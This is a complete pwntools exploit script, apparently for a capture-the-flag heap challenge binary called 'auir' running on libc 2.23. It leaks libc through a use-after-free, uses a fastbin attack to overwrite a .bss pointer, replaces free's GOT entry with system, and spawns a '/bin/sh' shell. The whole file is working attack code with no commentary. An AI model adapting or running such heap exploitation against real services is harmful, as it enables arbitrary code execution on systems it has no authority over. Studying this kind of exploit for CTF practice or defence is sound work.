#!/usr/bin/env python3

from pwn import *

exe = ELF("./auir")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    MAKE = "1"
    DESTROY = "2"
    EDIT = "3"
    DISPLAY = "4"
    EXIT = "5"

    bss = 0x605310

    # Leak libc address (main_arena)

    r.sendline(MAKE) # idx 0
    r.sendline("256") # size
    r.sendline("A" * 256)

    r.sendline(MAKE) # idx 1
    r.sendline("256") # size
    r.sendline("B" * 256)

    r.sendline(DESTROY)
    r.sendline("0") # index

    r.sendline(DISPLAY)
    r.sendline("0")

    r.recvuntil("[*]SHOWING....\n")
    leak = u64(r.recvn(8))
    libc.address = leak - 0x3c4b78
    log.info("libc base: {}".format(hex(libc.address)))
    
    # fastbin attack

    r.sendline(MAKE) # idx 2
    r.sendline(str(0x60)) # size
    r.sendline("A" * 0x60)

    r.sendline(MAKE) # idx 3
    r.sendline(str(0x60)) # size
    r.sendline("B" * 0x60)



    r.sendline(DESTROY)
    r.sendline("2") #idx

    r.sendline(DESTROY)
    r.sendline("3") #idx



    r.sendline(EDIT)
    r.sendline("3") #idx
    r.sendline("8") # size
    r.sendline(p64(bss - 0x23))



    r.sendline(MAKE) # idx 4
    r.sendline(str(0x60)) # size
    r.sendline("A" * 0x60)

    r.sendline(MAKE) # idx 5
    r.sendline(str(0x60)) # size
    r.sendline("B" * 0x60)

    r.sendline(EDIT)
    r.sendline("5") #idx
    r.sendline(str(0x1b)) # size
    r.sendline("A" * 0x13 + p64(exe.got['free']))

    r.sendline(EDIT)
    r.sendline("0") #idx
    r.sendline("8") # size
    r.sendline(p64(libc.symbols['system']))

    r.sendline(EDIT)
    r.sendline("5") #idx
    r.sendline("9") # size
    r.sendline("/bin/sh\x00")
    
    gdb.attach(r)

    r.interactive()


if __name__ == "__main__":
    main()
